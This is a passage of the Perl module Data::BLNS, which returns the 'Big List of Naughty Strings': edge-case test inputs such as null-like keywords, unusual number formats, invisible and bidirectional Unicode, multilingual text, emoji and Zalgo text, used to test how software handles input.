package Data::BLNS;

our $VERSION = '20182514.062550';

use 5.000;

sub import {
    *{caller().'::get_naughty_strings'} = \&_get_naughty_strings;
}

sub _get_naughty_strings {
    if (!wantarray) {
        require Carp;
        Carp::croak('Useless use of get_naughty_strings() in a non-list context');
    }
    
  "",
  "undefined",
  "undef",
  "null",
  "NULL",
  "(null)",
  "nil",
  "NIL",
  "true",
  "false",
  "True",
  "False",
  "TRUE",
  "FALSE",
  "None",
  "hasOwnProperty",
  "\\",
  "\\\\",
  0,
  1,
  "1.00",
  "\$1.00",
  "1/2",
  "1E2",
  "1E02",
  "1E+02",
  -1,
  "-1.00",
  "-\$1.00",
  "-1/2",
  "-1E2",
  "-1E02",
  "-1E+02",
  "1/0",
  "0/0",
  "-2147483648/-1",
  "-9223372036854775808/-1",
  "-0",
  "-0.0",
  "+0",
  "+0.0",
  "0.00",
  "0..0",
  ".",
  "0.0.0",
  "0,00",
  "0,,0",
  ",",
  "0,0,0",
  "0.0/0",
  "1.0/0.0",
  "0.0/0.0",
  "1,0/0,0",
  "0,0/0,0",
  "--1",
  "-",
  "-.",
  "-,",
  ("9" x 96),
  "NaN",
  "Infinity",
  "-Infinity",
  "INF",
  "1#INF",
  "-1#IND",
  "1#QNAN",
  "1#SNAN",
  "1#IND",
  "0x0",
  "0xffffffff",
  "0xffffffffffffffff",
  "0xabad1dea",
  "123456789012345678901234567890123456789",
  "1,000.00",
  "1 000.00",
  "1'000.00",
  "1,000,000.00",
  "1 000 000.00",
  "1'000'000.00",
  "1.000,00",
  "1 000,00",
  "1'000,00",
  "1.000.000,00",
  "1 000 000,00",
  "1'000'000,00",
  "01000",
  "08",
  "09",
  "2.2250738585072011e-308",
  ",./;'[]\\-=",
  "<>?:\"{}|_+",
  "!\@#\$%^&*()`~",
  pack("H*","01020304050607080e0f101112131415161718191a1b1c1d1e1f7f"),
  pack("H*","8081828384868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9f"),
  "\t\13\f \x85\xA0\x{1680}\x{2002}\x{2003}\x{2002}\x{2003}\x{2004}\x{2005}\x{2006}\x{2007}\x{2008}\x{2009}\x{200A}\x{200B}\x{2028}\x{2029}\x{202F}\x{205F}\x{3000}",
  "\xAD\x{600}\x{601}\x{602}\x{603}\x{604}\x{605}\x{61C}\x{6DD}\x{70F}\x{180E}\x{200B}\x{200C}\x{200D}\x{200E}\x{200F}\x{202A}\x{202B}\x{202C}\x{202D}\x{202E}\x{2060}\x{2061}\x{2062}\x{2063}\x{2064}\x{2066}\x{2067}\x{2068}\x{2069}\x{206A}\x{206B}\x{206C}\x{206D}\x{206E}\x{206F}\x{FEFF}\x{FFF9}\x{FFFA}\x{FFFB}\x{110BD}\x{1BCA0}\x{1BCA1}\x{1BCA2}\x{1BCA3}\x{1D173}\x{1D174}\x{1D175}\x{1D176}\x{1D177}\x{1D178}\x{1D179}\x{1D17A}\x{E0001}\x{E0020}\x{E0021}\x{E0022}\x{E0023}\x{E0024}\x{E0025}\x{E0026}\x{E0027}\x{E0028}\x{E0029}\x{E002A}\x{E002B}\x{E002C}\x{E002D}\x{E002E}\x{E002F}\x{E0030}\x{E0031}\x{E0032}\x{E0033}\x{E0034}\x{E0035}\x{E0036}\x{E0037}\x{E0038}\x{E0039}\x{E003A}\x{E003B}\x{E003C}\x{E003D}\x{E003E}\x{E003F}\x{E0040}\x{E0041}\x{E0042}\x{E0043}\x{E0044}\x{E0045}\x{E0046}\x{E0047}\x{E0048}\x{E0049}\x{E004A}\x{E004B}\x{E004C}\x{E004D}\x{E004E}\x{E004F}\x{E0050}\x{E0051}\x{E0052}\x{E0053}\x{E0054}\x{E0055}\x{E0056}\x{E0057}\x{E0058}\x{E0059}\x{E005A}\x{E005B}\x{E005C}\x{E005D}\x{E005E}\x{E005F}\x{E0060}\x{E0061}\x{E0062}\x{E0063}\x{E0064}\x{E0065}\x{E0066}\x{E0067}\x{E0068}\x{E0069}\x{E006A}\x{E006B}\x{E006C}\x{E006D}\x{E006E}\x{E006F}\x{E0070}\x{E0071}\x{E0072}\x{E0073}\x{E0074}\x{E0075}\x{E0076}\x{E0077}\x{E0078}\x{E0079}\x{E007A}\x{E007B}\x{E007C}\x{E007D}\x{E007E}\x{E007F}",
  "\x{FEFF}",
  "\x{FFFE}",
  "\x{3A9}\x{2248}\xE7\x{221A}\x{222B}\x{2DC}\xB5\x{2264}\x{2265}\xF7",
  "\xE5\xDF\x{2202}\x{192}\xA9\x{2D9}\x{2206}\x{2DA}\xAC\x{2026}\xE6",
  "\x{153}\x{2211}\xB4\xAE\x{2020}\xA5\xA8\x{2C6}\xF8\x{3C0}\x{201C}\x{2018}",
  "\xA1\x{2122}\xA3\xA2\x{221E}\xA7\xB6\x{2022}\xAA\xBA\x{2013}\x{2260}",
  "\xB8\x{2DB}\xC7\x{25CA}\x{131}\x{2DC}\xC2\xAF\x{2D8}\xBF",
  "\xC5\xCD\xCE\xCF\x{2DD}\xD3\xD4\x{F8FF}\xD2\xDA\xC6\x{2603}",
  "\x{152}\x{201E}\xB4\x{2030}\x{2C7}\xC1\xA8\x{2C6}\xD8\x{220F}\x{201D}\x{2019}",
  "`\x{2044}\x{20AC}\x{2039}\x{203A}\x{FB01}\x{FB02}\x{2021}\xB0\xB7\x{201A}\x{2014}\xB1",
  "\x{215B}\x{215C}\x{215D}\x{215E}",
  "\x{401}\x{402}\x{403}\x{404}\x{405}\x{406}\x{407}\x{408}\x{409}\x{40A}\x{40B}\x{40C}\x{40D}\x{40E}\x{40F}\x{410}\x{411}\x{412}\x{413}\x{414}\x{415}\x{416}\x{417}\x{418}\x{419}\x{41A}\x{41B}\x{41C}\x{41D}\x{41E}\x{41F}\x{420}\x{421}\x{422}\x{423}\x{424}\x{425}\x{426}\x{427}\x{428}\x{429}\x{42A}\x{42B}\x{42C}\x{42D}\x{42E}\x{42F}\x{430}\x{431}\x{432}\x{433}\x{434}\x{435}\x{436}\x{437}\x{438}\x{439}\x{43A}\x{43B}\x{43C}\x{43D}\x{43E}\x{43F}\x{440}\x{441}\x{442}\x{443}\x{444}\x{445}\x{446}\x{447}\x{448}\x{449}\x{44A}\x{44B}\x{44C}\x{44D}\x{44E}\x{44F}",
  "\x{660}\x{661}\x{662}\x{663}\x{664}\x{665}\x{666}\x{667}\x{668}\x{669}",
  "\x{2070}\x{2074}\x{2075}",
  "\x{2080}\x{2081}\x{2082}",
  "\x{2070}\x{2074}\x{2075}\x{2080}\x{2081}\x{2082}",
  "\x{E14}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47} \x{E14}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47} \x{E14}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}\x{E47}\x{E49}\x{E49}\x{E49}\x{E49}\x{E49}\x{E47}\x{E47}\x{E47}\x{E47}",
  "'",
  "\"",
  "''",
  "\"\"",
  "'\"'",
  "\"''''\"'\"",
  "\"'\"'\"''''\"",
  "<foo val=\x{201C}bar\x{201D} />",
  "<foo val=\x{201C}bar\x{201D} />",
  "<foo val=\x{201D}bar\x{201C} />",
  "<foo val=`bar' />",
  "\x{7530}\x{4E2D}\x{3055}\x{3093}\x{306B}\x{3042}\x{3052}\x{3066}\x{4E0B}\x{3055}\x{3044}",
  "\x{30D1}\x{30FC}\x{30C6}\x{30A3}\x{30FC}\x{3078}\x{884C}\x{304B}\x{306A}\x{3044}\x{304B}",
  "\x{548C}\x{88FD}\x{6F22}\x{8A9E}",
  "\x{90E8}\x{843D}\x{683C}",
  "\x{C0AC}\x{D68C}\x{ACFC}\x{D559}\x{C6D0} \x{C5B4}\x{D559}\x{C5F0}\x{AD6C}\x{C18C}",
  "\x{CC26}\x{CC28}\x{B97C} \x{D0C0}\x{ACE0} \x{C628} \x{D3B2}\x{C2DC}\x{B9E8}\x{ACFC} \x{C45B}\x{B2E4}\x{B9AC} \x{B620}\x{BC29}\x{AC01}\x{D558}",
  "\x{793E}\x{6703}\x{79D1}\x{5B78}\x{9662}\x{8A9E}\x{5B78}\x{7814}\x{7A76}\x{6240}",
  "\x{C6B8}\x{B780}\x{BC14}\x{D1A0}\x{B974}",
  "\x{2070E}\x{20731}\x{20779}\x{20C53}\x{20C78}\x{20C96}\x{20CCF}",
  "\x{23A}",
  "\x{23E}",
  "\x{30FD}\x{F3C}\x{E88}\x{644}\x{35C}\x{E88}\x{F3D}\x{FF89} \x{30FD}\x{F3C}\x{E88}\x{644}\x{35C}\x{E88}\x{F3D}\x{FF89} ",
  "(\x{FF61}\x{25D5} \x{2200} \x{25D5}\x{FF61})",
  "\x{FF40}\x{FF68}(\xB4\x{2200}\x{FF40}\x{2229}",
  "__\x{FF9B}(,_,*)",
  "\x{30FB}(\x{FFE3}\x{2200}\x{FFE3})\x{30FB}:*:",
  "\x{FF9F}\x{FF65}\x{273F}\x{30FE}\x{2572}(\x{FF61}\x{25D5}\x{203F}\x{25D5}\x{FF61})\x{2571}\x{273F}\x{FF65}\x{FF9F}",
  ",\x{3002}\x{30FB}:*:\x{30FB}\x{309C}\x{2019}( \x{263B} \x{3C9} \x{263B} )\x{3002}\x{30FB}:*:\x{30FB}\x{309C}\x{2019}",
  "(\x{256F}\xB0\x{25A1}\xB0\x{FF09}\x{256F}\x{FE35} \x{253B}\x{2501}\x{253B})",
  "(\x{FF89}\x{CA5}\x{76CA}\x{CA5}\x{FF09}\x{FF89}\x{FEFF} \x{253B}\x{2501}\x{253B}",
  "\x{252C}\x{2500}\x{252C}\x{30CE}( \xBA _ \xBA\x{30CE})",
  "( \x{361}\xB0 \x{35C}\x{296} \x{361}\xB0)",
  "\x{1F60D}",
  "\x{1F469}\x{1F3FD}",
  "\x{1F47E} \x{1F647} \x{1F481} \x{1F645} \x{1F646} \x{1F64B} \x{1F64E} \x{1F64D}",
  "\x{1F435} \x{1F648} \x{1F649} \x{1F64A}",
  "\x{2764}\x{FE0F} \x{1F494} \x{1F48C} \x{1F495} \x{1F49E} \x{1F493} \x{1F497} \x{1F496} \x{1F498} \x{1F49D} \x{1F49F} \x{1F49C} \x{1F49B} \x{1F49A} \x{1F499}",
  "\x{270B}\x{1F3FF} \x{1F4AA}\x{1F3FF} \x{1F450}\x{1F3FF} \x{1F64C}\x{1F3FF} \x{1F44F}\x{1F3FF} \x{1F64F}\x{1F3FF}",
  "\x{1F6BE} \x{1F192} \x{1F193} \x{1F195} \x{1F196} \x{1F197} \x{1F199} \x{1F3E7}",
  "0\x{FE0F}\x{20E3} 1\x{FE0F}\x{20E3} 2\x{FE0F}\x{20E3} 3\x{FE0F}\x{20E3} 4\x{FE0F}\x{20E3} 5\x{FE0F}\x{20E3} 6\x{FE0F}\x{20E3} 7\x{FE0F}\x{20E3} 8\x{FE0F}\x{20E3} 9\x{FE0F}\x{20E3} \x{1F51F}",
  "\x{1F1FA}\x{1F1F8}\x{1F1F7}\x{1F1FA}\x{1F1F8} \x{1F1E6}\x{1F1EB}\x{1F1E6}\x{1F1F2}\x{1F1F8}",
  "\x{1F1FA}\x{1F1F8}\x{1F1F7}\x{1F1FA}\x{1F1F8}\x{1F1E6}\x{1F1EB}\x{1F1E6}\x{1F1F2}",
  "\x{1F1FA}\x{1F1F8}\x{1F1F7}\x{1F1FA}\x{1F1F8}\x{1F1E6}",
  "\x{FF11}\x{FF12}\x{FF13}",
  "\x{661}\x{662}\x{663}",
  "\x{62B}\x{645} \x{646}\x{641}\x{633} \x{633}\x{642}\x{637}\x{62A} \x{648}\x{628}\x{627}\x{644}\x{62A}\x{62D}\x{62F}\x{64A}\x{62F}\x{60C}, \x{62C}\x{632}\x{64A}\x{631}\x{62A}\x{64A} \x{628}\x{627}\x{633}\x{62A}\x{62E}\x{62F}\x{627}\x{645} \x{623}\x{646} \x{62F}\x{646}\x{648}. \x{625}\x{630} \x{647}\x{646}\x{627}\x{61F} \x{627}\x{644}\x{633}\x{62A}\x{627}\x{631} \x{648}\x{62A}\x{646}\x{635}\x{64A}\x{628} \x{643}\x{627}\x{646}. \x{623}\x{647}\x{651}\x{644} \x{627}\x{64A}\x{637}\x{627}\x{644}\x{64A}\x{627}\x{60C} \x{628}\x{631}\x{64A}\x{637}\x{627}\x{646}\x{64A}\x{627}-\x{641}\x{631}\x{646}\x{633}\x{627} \x{642}\x{62F} \x{623}\x{62E}\x{630}. \x{633}\x{644}\x{64A}\x{645}\x{627}\x{646}\x{60C} \x{625}\x{62A}\x{641}\x{627}\x{642}\x{64A}\x{629} \x{628}\x{64A}\x{646} \x{645}\x{627}, \x{64A}\x{630}\x{643}\x{631} \x{627}\x{644}\x{62D}\x{62F}\x{648}\x{62F} \x{623}\x{64A} \x{628}\x{639}\x{62F}, \x{645}\x{639}\x{627}\x{645}\x{644}\x{629} \x{628}\x{648}\x{644}\x{646}\x{62F}\x{627}\x{60C} \x{627}\x{644}\x{625}\x{637}\x{644}\x{627}\x{642} \x{639}\x{644} \x{625}\x{64A}\x{648}.",
  "\x{5D1}\x{5B0}\x{5BC}\x{5E8}\x{5B5}\x{5D0}\x{5E9}\x{5B4}\x{5C1}\x{5D9}\x{5EA}, \x{5D1}\x{5B8}\x{5BC}\x{5E8}\x{5B8}\x{5D0} \x{5D0}\x{5B1}\x{5DC}\x{5B9}\x{5D4}\x{5B4}\x{5D9}\x{5DD}, \x{5D0}\x{5B5}\x{5EA} \x{5D4}\x{5B7}\x{5E9}\x{5B8}\x{5BC}\x{5C1}\x{5DE}\x{5B7}\x{5D9}\x{5B4}\x{5DD}, \x{5D5}\x{5B0}\x{5D0}\x{5B5}\x{5EA} \x{5D4}\x{5B8}\x{5D0}\x{5B8}\x{5E8}\x{5B6}\x{5E5}",
  "\x{5D4}\x{5B8}\x{5D9}\x{5B0}\x{5EA}\x{5B8}\x{5D4}test\x{627}\x{644}\x{635}\x{641}\x{62D}\x{627}\x{62A} \x{627}\x{644}\x{62A}\x{651}\x{62D}\x{648}\x{644}",
  "\x{FDFD}",
  "\x{FDFA}",
  "\x{645}\x{64F}\x{646}\x{64E}\x{627}\x{642}\x{64E}\x{634}\x{64E}\x{629}\x{64F} \x{633}\x{64F}\x{628}\x{64F}\x{644}\x{650} \x{627}\x{650}\x{633}\x{652}\x{62A}\x{650}\x{62E}\x{652}\x{62F}\x{64E}\x{627}\x{645}\x{650} \x{627}\x{644}\x{644}\x{64F}\x{651}\x{63A}\x{64E}\x{629}\x{650} \x{641}\x{650}\x{64A} \x{627}\x{644}\x{646}\x{64F}\x{651}\x{638}\x{64F}\x{645}\x{650} \x{627}\x{644}\x{652}\x{642}\x{64E}\x{627}\x{626}\x{650}\x{645}\x{64E}\x{629}\x{650} \x{648}\x{64E}\x{641}\x{650}\x{64A}\x{645} \x{64A}\x{64E}\x{62E}\x{64F}\x{635}\x{64E}\x{651} \x{627}\x{644}\x{62A}\x{64E}\x{651}\x{637}\x{652}\x{628}\x{650}\x{64A}\x{642}\x{64E}\x{627}\x{62A}\x{64F} \x{627}\x{644}\x{652}\x{62D}\x{627}\x{633}\x{64F}\x{648}\x{628}\x{650}\x{64A}\x{64E}\x{651}\x{629}\x{64F}\x{60C} ",
  "\x{200B}",
  "\x{1680}",
  "\x{180E}",
  "\x{3000}",
  "\x{FEFF}",
  "\x{2423}",
  "\x{2422}",
  "\x{2421}",
  "\x{202A}\x{202A}test\x{202A}",
  "\x{202B}test\x{202B}",
  "\x{2029}test\x{2029}",
  "test\x{2060}test\x{202B}",
  "\x{2066}test\x{2067}",
  "\x{1E70}\x{33A}\x{33A}\x{315}o\x{35E} \x{337}i\x{332}\x{32C}\x{347}\x{32A}\x{359}n\x{31D}\x{317}\x{355}v\x{31F}\x{31C}\x{318}\x{326}\x{35F}o\x{336}\x{319}\x{330}\x{320}k\xE8\x{35A}\x{32E}\x{33A}\x{32A}\x{339}\x{331}\x{324} \x{316}t\x{31D}\x{355}\x{333}\x{323}\x{33B}\x{32A}\x{35E}h\x{33C}\x{353}\x{332}\x{326}\x{333}\x{318}\x{332}e\x{347}\x{323}\x{330}\x{326}\x{32C}\x{34E} \x{322}\x{33C}\x{33B}\x{331}\x{318}h\x{35A}\x{34E}\x{359}\x{31C}\x{323}\x{332}\x{345}i\x{326}\x{332}\x{323}\x{330}\x{324}v\x{33B}\x{34D}e\x{33A}\x{32D}\x{333}\x{32A}\x{330}-m\x{322}i\x{345}n\x{316}\x{33A}\x{31E}\x{332}\x{32F}\x{330}d\x{335}\x{33C}\x{31F}\x{359}\x{329}\x{33C}\x{318}\x{333} \x{31E}\x{325}\x{331}\x{333}\x{32D}r\x{31B}\x{317}\x{318}e\x{359}p\x{360}r\x{33C}\x{31E}\x{33B}\x{32D}\x{317}e\x{33A}\x{320}\x{323}\x{35F}s\x{318}\x{347}\x{333}\x{34D}\x{31D}\x{349}e\x{349}\x{325}\x{32F}\x{31E}\x{332}\x{35A}\x{32C}\x{35C}\x{1F9}\x{32C}\x{34E}\x{34E}\x{31F}\x{316}\x{347}\x{324}t\x{34D}\x{32C}\x{324}\x{353}\x{33C}\x{32D}\x{358}\x{345}i\x{32A}\x{331}n\x{360}g\x{334}\x{349} \x{34F}\x{349}\x{345}c\x{32C}\x{31F}h\x{361}a\x{32B}\x{33B}\x{32F}\x{358}o\x{32B}\x{31F}\x{316}\x{34D}\x{319}\x{31D}\x{349}s\x{317}\x{326}\x{332}.\x{328}\x{339}\x{348}\x{323}",
  "\x{321}\x{353}\x{31E}\x{345}I\x{317}\x{318}\x{326}\x{35D}n\x{347}\x{347}\x{359}v\x{32E}\x{32B}ok\x{332}\x{32B}\x{319}\x{348}i\x{316}\x{359}\x{32D}\x{339}\x{320}\x{31E}n\x{321}\x{33B}\x{32E}\x{323}\x{33A}g\x{332}\x{348}\x{359}\x{32D}\x{359}\x{32C}\x{34E} \x{330}t\x{354}\x{326}h\x{31E}\x{332}e\x{322}\x{324} \x{34D}\x{32C}\x{332}\x{356}f\x{334}\x{318}\x{355}\x{323}\xE8\x{356}\x{1EB9}\x{325}\x{329}l\x{356}\x{354}\x{35A}i\x{353}\x{35A}\x{326}\x{360}n\x{356}\x{34D}\x{317}\x{353}\x{333}\x{32E}g\x{34D} \x{328}o\x{35A}\x{32A}\x{361}f\x{318}\x{323}\x{32C} \x{316}\x{318}\x{356}\x{31F}\x{359}\x{32E}c\x{489}\x{354}\x{32B}\x{356}\x{353}\x{347}\x{356}\x{345}h\x{335}\x{324}\x{323}\x{35A}\x{354}\xE1\x{317}\x{33C}\x{355}\x{345}o\x{33C}\x{323}\x{325}s\x{331}\x{348}\x{33A}\x{316}\x{326}\x{33B}\x{362}.\x{31B}\x{316}\x{31E}\x{320}\x{32B}\x{330}",
  "\x{317}\x{33A}\x{356}\x{339}\x{32F}\x{353}\x{1E6E}\x{324}\x{34D}\x{325}\x{347}\x{348}h\x{332}\x{301}e\x{34F}\x{353}\x{33C}\x{317}\x{319}\x{33C}\x{323}\x{354} \x{347}\x{31C}\x{331}\x{320}\x{353}\x{34D}\x{345}N\x{355}\x{360}e\x{317}\x{331}z\x{318}\x{31D}\x{31C}\x{33A}\x{359}p\x{324}\x{33A}\x{339}\x{34D}\x{32F}\x{35A}e\x{320}\x{33B}\x{320}\x{35C}r\x{328}\x{324}\x{34D}\x{33A}\x{316}\x{354}\x{316}\x{316}d\x{320}\x{31F}\x{32D}\x{32C}\x{31D}\x{35F}i\x{326}\x{356}\x{329}\x{353}\x{354}\x{324}a\x{320}\x{317}\x{32C}\x{349}\x{319}n\x{35A}\x{35C} \x{33B}\x{31E}\x{330}\x{35A}\x{345}h\x{335}\x{349}i\x{333}\x{31E}v\x{322}\x{347}\x{1E19}\x{34E}\x{35F}-\x{489}\x{32D}\x{329}\x{33C}\x{354}m\x{324}\x{32D}\x{32B}i\x{355}\x{347}\x{31D}\x{326}n\x{317}\x{359}\x{1E0D}\x{31F} \x{32F}\x{332}\x{355}\x{35E}\x{1EB}\x{31F}\x{32F}\x{330}\x{332}\x{359}\x{33B}\x{31D}f \x{32A}\x{330}\x{330}\x{317}\x{316}\x{32D}\x{318}\x{358}c\x{326}\x{34D}\x{332}\x{31E}\x{34D}\x{329}\x{319}\x{1E25}\x{35A}a\x{32E}\x{34E}\x{31F}\x{319}\x{35C}\x{1A1}\x{329}\x{339}\x{34E}s\x{324}.\x{31D}\x{31D} \x{489}Z\x{321}\x{316}\x{31C}\x{356}\x{330}\x{323}\x{349}\x{31C}a\x{356}\x{330}\x{359}\x{32C}\x{361}l\x{332}\x{32B}\x{333}\x{34D}\x{329}g\x{321}\x{31F}\x{33C}\x{331}\x{35A}\x{31E}\x{32C}\x{345}o\x{317}\x{35C}.\x{31F}",
  "\x{326}H\x{32C}\x{324}\x{317}\x{324}\x{35D}e\x{35C} \x{31C}\x{325}\x{31D}\x{33B}\x{34D}\x{31F}\x{301}w\x{315}h\x{316}\x{32F}\x{353}o\x{31D}\x{359}\x{316}\x{34E}\x{331}\x{32E} \x{489}\x{33A}\x{319}\x{31E}\x{31F}\x{348}W\x{337}\x{33C}\x{32D}a\x{33A}\x{32A}\x{34D}\x{12F}\x{348}\x{355}\x{32D}\x{359}\x{32F}\x{31C}t\x{336}\x{33C}\x{32E}s\x{318}\x{359}\x{356}\x{315} \x{320}\x{32B}\x{320}B\x{33B}\x{34D}\x{359}\x{349}\x{333}\x{345}e\x{335}h\x{335}\x{32C}\x{347}\x{32B}\x{359}i\x{339}\x{353}\x{333}\x{333}\x{32E}\x{34E}\x{32B}\x{315}n\x{35F}d\x{334}\x{32A}\x{31C}\x{316} \x{330}\x{349}\x{329}\x{347}\x{359}\x{332}\x{35E}\x{345}T\x{356}\x{33C}\x{353}\x{32A}\x{362}h\x{34F}\x{353}\x{32E}\x{33B}e\x{32C}\x{31D}\x{31F}\x{345} \x{324}\x{339}\x{31D}W\x{359}\x{31E}\x{31D}\x{354}\x{347}\x{35D}\x{345}a\x{34F}\x{353}\x{354}\x{339}\x{33C}\x{323}l\x{334}\x{354}\x{330}\x{324}\x{31F}\x{354}\x{1E3D}\x{32B}.\x{355}",
  "Z\x{32E}\x{31E}\x{320}\x{359}\x{354}\x{345}\x{1E00}\x{317}\x{31E}\x{348}\x{33B}\x{317}\x{1E36}\x{359}\x{34E}\x{32F}\x{339}\x{31E}\x{353}G\x{33B}O\x{32D}\x{317}\x{32E}",
  "\x{2D9}\x{250}nb\x{1D09}l\x{250} \x{250}u\x{183}\x{250}\x{26F} \x{1DD}\x{279}olop \x{287}\x{1DD} \x{1DD}\x{279}oq\x{250}l \x{287}n \x{287}unp\x{1D09}p\x{1D09}\x{254}u\x{1D09} \x{279}od\x{26F}\x{1DD}\x{287} po\x{26F}sn\x{1D09}\x{1DD} op p\x{1DD}s '\x{287}\x{1D09}l\x{1DD} \x{183}u\x{1D09}\x{254}s\x{1D09}d\x{1D09}p\x{250} \x{279}n\x{287}\x{1DD}\x{287}\x{254}\x{1DD}suo\x{254} '\x{287}\x{1DD}\x{26F}\x{250} \x{287}\x{1D09}s \x{279}olop \x{26F}nsd\x{1D09} \x{26F}\x{1DD}\x{279}o\x{2E5}",
  "00\x{2D9}\x{196}\$-",
  "\x{FF34}\x{FF48}\x{FF45} \x{FF51}\x{FF55}\x{FF49}\x{FF43}\x{FF4B} \x{FF42}\x{FF52}\x{FF4F}\x{FF57}\x{FF4E} \x{FF46}\x{FF4F}\x{FF58} \x{FF4A}\x{FF55}\x{FF4D}\x{FF50}\x{FF53} \x{FF4F}\x{FF56}\x{FF45}\x{FF52} \x{FF54}\x{FF48}\x{FF45} \x{FF4C}\x{FF41}\x{FF5A}\x{FF59} \x{FF44}\x{FF4F}\x{FF47}",
  "\x{1D413}\x{1D421}\x{1D41E} \x{1D42A}\x{1D42E}\x{1D422}\x{1D41C}\x{1D424} \x{1D41B}\x{1D42B}\x{1D428}\x{1D430}\x{1D427} \x{1D41F}\x{1D428}\x{1D431} \x{1D423}\x{1D42E}\x{1D426}\x{1D429}\x{1D42C} \x{1D428}\x{1D42F}\x{1D41E}\x{1D42B} \x{1D42D}\x{1D421}\x{1D41E} \x{1D425}\x{1D41A}\x{1D433}\x{1D432} \x{1D41D}\x{1D428}\x{1D420}",
  "\x{1D57F}\x{1D58D}\x{1D58A} \x{1D596}\x{1D59A}\x{1D58E}\x{1D588}\x{1D590} \x{1D587}\x{1D597}\x{1D594}\x{1D59C}\x{1D593} \x{1D58B}\x{1D594}\x{1D59D} \x{1D58F}\x{1D59A}\x{1D592}\x{1D595}\x{1D598} \x{1D594}\x{1D59B}\x{1D58A}\x{1D597} \x{1D599}\x{1D58D}\x{1D58A} \x{1D591}\x{1D586}\x{1D59F}\x{1D59E} \x{1D589}\x{1D594}\x{1D58C}",
  "\x{1D47B}\x{1D489}\x{1D486} \x{1D492}\x{1D496}\x{1D48A}\x{1D484}\x{1D48C} \x{1D483}\x{1D493}\x{1D490}\x{1D498}\x{1D48F} \x{1D487}\x{1D490}\x{1D499} \x{1D48B}\x{1D496}\x{1D48E}\x{1D491}\x{1D494} \x{1D490}\x{1D497}\x{1D486}\x{1D493} \x{1D495}\x{1D489}\x{1D486} \x{1D48D}\x{1D482}\x{1D49B}\x{1D49A} \x{1D485}\x{1D490}\x{1D488}",
  "\x{1D4E3}\x{1D4F1}\x{1D4EE} \x{1D4FA}\x{1D4FE}\x{1D4F2}\x{1D4EC}\x{1D4F4} \x{1D4EB}\x{1D4FB}\x{1D4F8}\x{1D500}\x{1D4F7} \x{1D4EF}\x{1D4F8}\x{1D501} \x{1D4F3}\x{1D4FE}\x{1D4F6}\x{1D4F9}\x{1D4FC} \x{1D4F8}\x{1D4FF}\x{1D4EE}\x{1D4FB} \x{1D4FD}\x{1D4F1}\x{1D4EE} \x{1D4F5}\x{1D4EA}\x{1D503}\x{1D502} \x{1D4ED}\x{1D4F8}\x{1D4F0}",
  "\x{1D54B}\x{1D559}\x{1D556} \x{1D562}\x{1D566}\x{1D55A}\x{1D554}\x{1D55C} \x{1D553}\x{1D563}\x{1D560}\x{1D568}\x{1D55F} \x{1D557}\x{1D560}\x{1D569} \x{1D55B}\x{1D566}\x{1D55E}\x{1D561}\x{1D564} \x{1D560}\x{1D567}\x{1D556}\x{1D563} \x{1D565}\x{1D559}\x{1D556} \x{1D55D}\x{1D552}\x{1D56B}\x{1D56A} \x{1D555}\x{1D560}\x{1D558}",
  "\x{1D683}\x{1D691}\x{1D68E} \x{1D69A}\x{1D69E}\x{1D692}\x{1D68C}\x{1D694} \x{1D68B}\x{1D69B}\x{1D698}\x{1D6A0}\x{1D697} \x{1D68F}\x{1D698}\x{1D6A1} \x{1D693}\x{1D69E}\x{1D696}\x{1D699}\x{1D69C} \x{1D698}\x{1D69F}\x{1D68E}\x{1D69B} \x{1D69D}\x{1D691}\x{1D68E} \x{1D695}\x{1D68A}\x{1D6A3}\x{1D6A2} \x{1D68D}\x{1D698}\x{1D690}",
